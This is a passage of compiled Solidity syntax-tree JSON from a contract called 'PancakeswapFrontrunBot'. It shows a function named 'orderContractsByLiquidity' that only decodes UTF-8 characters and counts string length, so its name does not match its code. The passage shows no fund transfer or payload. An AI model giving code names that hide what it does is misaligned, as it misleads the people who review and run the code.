																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 689,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7182:4:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7170:16:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 694,
															"nodeType": "IfStatement",
															"src": "7166:108:3",
															"trueBody": {
																"id": 693,
																"nodeType": "Block",
																"src": "7188:86:3",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"hexValue": "30",
																			"id": 691,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7257:1:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		},
																		"functionReturnParameters": 571,
																		"id": 692,
																		"nodeType": "Return",
																		"src": "7250:8:3"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 705,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 695,
																	"name": "ret",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 570,
																	"src": "7288:3:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 704,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 698,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 696,
																					"name": "ret",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 570,
																					"src": "7295:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "*",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3634",
																					"id": 697,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7301:2:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_64_by_1",
																						"typeString": "int_const 64"
																					},
																					"value": "64"
																				},
																				"src": "7295:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 699,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7294:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "|",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 702,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 700,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 594,
																					"src": "7308:1:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "&",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30783346",
																					"id": 701,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7312:4:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_63_by_1",
																						"typeString": "int_const 63"
																					},
																					"value": "0x3F"
																				},
																				"src": "7308:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"id": 703,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "7307:10:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "7294:23:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "7288:29:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 706,
															"nodeType": "ExpressionStatement",
															"src": "7288:29:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 667,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 665,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 662,
														"src": "7054:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 666,
														"name": "length",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 584,
														"src": "7058:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7054:10:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 708,
												"initializationExpression": {
													"assignments": [
														662
													],
													"declarations": [
														{
															"constant": false,
															"id": 662,
															"mutability": "mutable",
															"name": "i",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 708,
															"src": "7042:6:3",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 661,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "7042:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 664,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 663,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7051:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "7042:10:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 669,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "7066:3:3",
														"subExpression": {
															"argumentTypes": null,
															"id": 668,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 662,
															"src": "7066:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 670,
													"nodeType": "ExpressionStatement",
													"src": "7066:3:3"
												},
												"nodeType": "ForStatement",
												"src": "7037:292:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 709,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 570,
													"src": "7349:3:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 571,
												"id": 710,
												"nodeType": "Return",
												"src": "7342:10:3"
											}
										]
									},
									"documentation": null,
									"id": 712,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "orderContractsByLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 568,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 567,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 712,
												"src": "6248:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 566,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "6248:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6247:19:3"
									},
									"returnParameters": {
										"id": 571,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 570,
												"mutability": "mutable",
												"name": "ret",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 712,
												"src": "6290:8:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 569,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "6290:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6289:10:3"
									},
									"scope": 1724,
									"src": "6213:1147:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 799,
										"nodeType": "Block",
										"src": "7620:574:3",
										"statements": [
											{
												"assignments": [
													720
												],
												"declarations": [
													{
														"constant": false,
														"id": 720,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 799,
														"src": "7631:8:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 719,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7631:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 725,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 724,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 721,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 714,
															"src": "7642:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 722,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 125,
														"src": "7642:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "3331",
														"id": 723,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "7654:2:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_31_by_1",
															"typeString": "int_const 31"
														},
														"value": "31"
													},
													"src": "7642:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7631:25:3"
											},
											{
												"assignments": [
													727
												],
												"declarations": [
													{
														"constant": false,
														"id": 727,
														"mutability": "mutable",
														"name": "end",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 799,
														"src": "7667:8:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 726,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "7667:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 732,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 731,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 728,
														"name": "ptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 720,
														"src": "7678:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 729,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 714,
															"src": "7684:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 730,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "7684:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7678:15:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "7667:26:3"
											},
											{
												"body": {
													"id": 797,
													"nodeType": "Block",
													"src": "7732:455:3",
													"statements": [
														{
															"assignments": [
																744
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 744,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 797,
																	"src": "7747:7:3",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"typeName": {
																		"id": 743,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "7747:5:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 745,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "7747:7:3"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "7778:30:3",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "7780:26:3",
																		"value": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "ptr",
																							"nodeType": "YulIdentifier",
																							"src": "7795:3:3"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "7789:5:3"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "7789:10:3"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "7801:4:3",
																					"type": "",
																					"value": "0xFF"
																				}
																			],
																			"functionName": {
																				"name": "and",
																				"nodeType": "YulIdentifier",
																				"src": "7785:3:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "7785:21:3"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "7780:1:3"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 744,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7780:1:3",
																	"valueSize": 1
																},
																{
																	"declaration": 720,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "7795:3:3",
																	"valueSize": 1
																}
															],
															"id": 746,
															"nodeType": "InlineAssembly",
															"src": "7769:39:3"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																},
																"id": 749,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 747,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 744,
																	"src": "7826:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30783830",
																	"id": 748,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "7830:4:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_128_by_1",
																		"typeString": "int_const 128"
																	},
																	"value": "0x80"
																},
																"src": "7826:8:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint8",
																		"typeString": "uint8"
																	},
																	"id": 757,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 755,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 744,
																		"src": "7888:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "<",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "30784530",
																		"id": 756,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "7892:4:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_224_by_1",
																			"typeString": "int_const 224"
																		},
																		"value": "0xE0"
																	},
																	"src": "7888:8:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 765,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 763,
																			"name": "b",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 744,
																			"src": "7950:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "30784630",
																			"id": 764,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "7954:4:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_240_by_1",
																				"typeString": "int_const 240"
																			},
																			"value": "0xF0"
																		},
																		"src": "7950:8:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": {
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 773,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 771,
																				"name": "b",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 744,
																				"src": "8012:1:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30784638",
																				"id": 772,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8016:4:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_248_by_1",
																					"typeString": "int_const 248"
																				},
																				"value": "0xF8"
																			},
																			"src": "8012:8:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": {
																			"condition": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 781,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 779,
																					"name": "b",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 744,
																					"src": "8074:1:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "30784643",
																					"id": 780,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8078:4:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_252_by_1",
																						"typeString": "int_const 252"
																					},
																					"value": "0xFC"
																				},
																				"src": "8074:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			},
																			"falseBody": {
																				"id": 791,
																				"nodeType": "Block",
																				"src": "8133:43:3",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 789,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 787,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 720,
																								"src": "8152:3:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "36",
																								"id": 788,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8159:1:3",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_6_by_1",
																									"typeString": "int_const 6"
																								},
																								"value": "6"
																							},
																							"src": "8152:8:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 790,
																						"nodeType": "ExpressionStatement",
																						"src": "8152:8:3"
																					}
																				]
																			},
																			"id": 792,
																			"nodeType": "IfStatement",
																			"src": "8071:105:3",
																			"trueBody": {
																				"id": 786,
																				"nodeType": "Block",
																				"src": "8084:43:3",
																				"statements": [
																					{
																						"expression": {
																							"argumentTypes": null,
																							"id": 784,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftHandSide": {
																								"argumentTypes": null,
																								"id": 782,
																								"name": "ptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 720,
																								"src": "8103:3:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "Assignment",
																							"operator": "+=",
																							"rightHandSide": {
																								"argumentTypes": null,
																								"hexValue": "35",
																								"id": 783,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "8110:1:3",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_5_by_1",
																									"typeString": "int_const 5"
																								},
																								"value": "5"
																							},
																							"src": "8103:8:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"id": 785,
																						"nodeType": "ExpressionStatement",
																						"src": "8103:8:3"
																					}
																				]
																			}
																		},
																		"id": 793,
																		"nodeType": "IfStatement",
																		"src": "8009:167:3",
																		"trueBody": {
																			"id": 778,
																			"nodeType": "Block",
																			"src": "8022:43:3",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 776,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 774,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 720,
																							"src": "8041:3:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "34",
																							"id": 775,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "8048:1:3",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_4_by_1",
																								"typeString": "int_const 4"
																							},
																							"value": "4"
																						},
																						"src": "8041:8:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 777,
																					"nodeType": "ExpressionStatement",
																					"src": "8041:8:3"
																				}
																			]
																		}
																	},
																	"id": 794,
																	"nodeType": "IfStatement",
																	"src": "7947:229:3",
																	"trueBody": {
																		"id": 770,
																		"nodeType": "Block",
																		"src": "7960:43:3",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 768,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 766,
																						"name": "ptr",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 720,
																						"src": "7979:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "+=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "33",
																						"id": 767,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "7986:1:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_3_by_1",
																							"typeString": "int_const 3"
																						},
																						"value": "3"
																					},
																					"src": "7979:8:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 769,
																				"nodeType": "ExpressionStatement",
																				"src": "7979:8:3"
																			}
																		]
																	}
																},
																"id": 795,
																"nodeType": "IfStatement",
																"src": "7885:291:3",
																"trueBody": {
																	"id": 762,
																	"nodeType": "Block",
																	"src": "7898:43:3",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 760,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 758,
																					"name": "ptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 720,
																					"src": "7917:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "+=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 759,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "7924:1:3",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "7917:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 761,
